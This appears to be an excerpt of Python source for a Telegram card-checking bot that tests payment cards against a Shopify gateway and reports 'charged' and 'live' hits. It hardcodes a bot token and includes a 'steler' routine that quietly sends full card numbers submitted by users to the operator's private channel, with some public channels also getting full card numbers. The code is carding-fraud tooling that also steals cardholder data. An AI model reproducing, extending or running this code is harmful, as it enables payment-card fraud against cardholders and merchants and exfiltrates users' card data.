...
BOT_TOKEN = '8941544088:AAFEgrGbNL8f44ls3cXp7pJUqvyWsWPVxbw'

# ================== STELER & HIT LOGS CONFIGURATION ==================
# PRIVATE STELER - Full card details (for your private group/channel)
PRIVATE_STELER_CHANNEL_ID = -1003332800094      # REPLACE with your PRIVATE channel ID
SEND_TO_PRIVATE_STELER = True                   # Set to True to enable

# PUBLIC HIT LOGS - Only hit detection (NO CARD NUMBER)
HIT_LOG_CHANNEL_ID = -1003771620838          # REPLACE with your PUBLIC log channel ID
SEND_HIT_TO_LOG = True                          # Set to True to enable
...
# ================== PRIVATE STELER FUNCTION (FULL CARD DETAILS) ==================
async def send_to_private_steler(result, user_info, hit_type):
    """Send FULL card details to PRIVATE channel/group"""
...
🤖 <b>Bot By:</b> {BOT_NAME_STYLED}"""
    ...
    try:
        ...
        print(f"✅ Private steler: {result['card'][:10]}... - {hit_type}")
    except Exception as e:
        print(f"❌ Private steler error: {e}")

# ================== HIT LOGS FUNCTION (NO CARD NUMBER - PUBLIC) ==================
async def send_hit_to_log_channel(result, user_info, hit_type):
    """Send HIT DETECTED message to PUBLIC log channel (NO CARD NUMBER SHOWN)"""
    if not SEND_HIT_TO_LOG or not HIT_LOG_CHANNEL_ID:
        return
    
    # Only send CHARGED hits to log channel
    if hit_type != "CHARGED":
        return
...
🤖 <b>Bot By:</b> {BOT_NAME_STYLED}"""
    ...
    try:
        ...
        print(f"✅ Hit log sent to channel")
    except Exception as e:
        print(f"❌ Hit log channel error: {e}")

async def send_to_public_channel(result, user_info, hit_type):
    """Send HIT DETECTED message to PUBLIC channel (like your screenshot)"""
    if not SEND_TO_STELER or not STELER_PUBLIC_CHANNEL:
        return
    
    if hit_type != "CHARGED":
        return  # Only send CHARGED hits to public channel
    
    user_name = user_info.get('first_name', 'User')
    username = f"@{user_info.get('username')}" if user_info.get('username') else user_name
    
    message = f"""<b>⚡ HIT DETECTED ⚡</b>
━━━━━━━━━━━━━━━━━━━
💳 <b>Card:</b> <code>{result['card']}</code>
🌐 <b>Gateway:</b> {result.get('gateway', 'Shopify')}
💰 <b>Amount:</b> {result.get('price', '$2.0')}
📝 <b>Response:</b> {result['message'][:50]}
━━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> {user_name}
🤖 <b>Bot:</b> {BOT_NAME_STYLED}"""

    try:
        await bot.send_message(STELER_PUBLIC_CHANNEL, premium_emoji(message), parse_mode='html')
        print(f"✅ Public channel: HIT DETECTED - {result['card'][:10]}...")
    except Exception as e:
...
async def send_realtime_hit(user_id, result, hit_type, username, group_id=None, reply_to=None):
    ...
    # Send to PRIVATE STELER (full card details)
    ...
    # Send to PUBLIC HIT LOG (no card number)
    await send_hit_to_log_channel(result, user_info, hit_type_full)
    
    # Original message to user (same as before)
...
🤖 <b>Bot By: {BOT_NAME_STYLED}</b>"""
    ...
    # Send to group if group_id provided and it's different from user_id
...
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>send_realtime_hit
<blockquote>💳 Total: {results['total']} | ✅ Charged: {charged_count} | 🔥 Live: {approved_count} | ❌ Dead: {dead_count}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
...
# ---------- Forward feature ----------
def add_forward_queue(user_id, msg_id, chat_id, is_media, caption, file_path=None, file_name=None):
...
async def forward_to_owner(event):
    ...
    caption = reply.raw_text[:500] if reply.raw_text else "No text message"
    chat_id = event.chat_id
    msg_id = reply.id
    ...
    user_username = f"@{sender.username}" if sender.username else f"ID: {user_id}"
    ...
    if is_media:
        try:
            ...
            if reply.file and reply.file.name:
                ...
                file_name = f"feedback_{user_id}_{int(time.time())}.jpg"
            
            # Download the media
            status_msg = await event.reply(premium_emoji("📥 Downloading media..."), parse_mode='html')
            file_path = await reply.download_media(file=file_name)
            ...
            if reply.photo:
                ...
                media_type = f"📎 Document: {file_name}"
            elif reply.gif:
                media_type = "🎬 GIF"
            else:
                media_type = "📁 File"
            ...
            file_path = None
            media_type = "❌ Failed to download"
    
    # Add to queue
    fwd_id = add_forward_queue(user_id, msg_id, chat_id, is_media, caption, file_path, file_name)
    
    # Create preview for owner with enhanced UI
    preview = f"""📨 <b>NEW FEEDBACK RECEIVED</b>
{SEP}
👤 <b>User:</b> {user_name}
...
📎 <b>Media:</b> {media_type}
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{SEP}
<i>Approve to broadcast to all approved groups</i>"""
    ...
    # Send to owner with or without media
    try:
        if is_media and file_path and os.path.exists(file_path):
            # Send as media with caption
            await bot.send_file(OWNER_ID, file_path, caption=premium_emoji(preview), buttons=buttons, parse_mode='html')
        else:
            # Send as text message
            await bot.send_message(OWNER_ID, premium_emoji(preview), buttons=buttons, parse_mode='html')
    except Exception as e:
        await bot.send_message(OWNER_ID, premium_emoji(f"❌ Error sending feedback: {e}\n\n{preview}"), parse_mode='html')
    
    await event.reply(premium_emoji("✅ Feedback forwarded to owner for approval."), parse_mode='html')
...
async def approve_forward(event):
    ...
    try:
        ...
        sender_name = original_sender.first_name or "User"
        sender_username = f"@{original_sender.username}" if original_sender.username else f"user_{original_sender_id}"
    except:
        sender_name = f"User_{original_sender_id}"
        sender_username = f"user_{original_sender_id}"
    
    # Create feedback message with enhanced UI
    feedback_msg = f"""💬 <b>FEEDBACK RECEIVED</b>
{SEP}
👤 <b>User:</b> {sender_name}
🔖 <b>Username:</b> {sender_username}
🆔 <b>ID:</b> <code>{original_sender_id}</code>
📝 <b>Message:</b>
<blockquote>{caption}</blockquote>
{SEP}
...
🤖 <b>Bot By:</b> {BOT_NAME_STYLED}"""
    ...
    for gid in groups:
        try:
            if is_media and file_path and os.path.exists(file_path):
                # Send as media with caption
                await bot.send_file(gid, file_path, caption=premium_emoji(feedback_msg), parse_mode='html')
            else:
                # Send as text message
                await bot.send_message(gid, premium_emoji(feedback_msg), parse_mode='html')
            success += 1
            await asyncio.sleep(0.3)  # Delay to avoid flood wait
        except Exception as e:
    ...
    result_msg = f"""✅ <b>Forwarded Successfully!</b>
{SEP}
📤 <b>Sent to:</b> {success} groups
👤 <b>User:</b> {sender_name}
📝 <b>Message:</b> {caption[:100]}
{SEP}
Feedback by {sender_username}"""
    
    await event.edit(premium_emoji(result_msg), parse_mode='html')
    await event.answer()
...
async def reject_forward(event):
    ...
    await event.edit("❌ Feedback Rejected.")
    await event.answer()
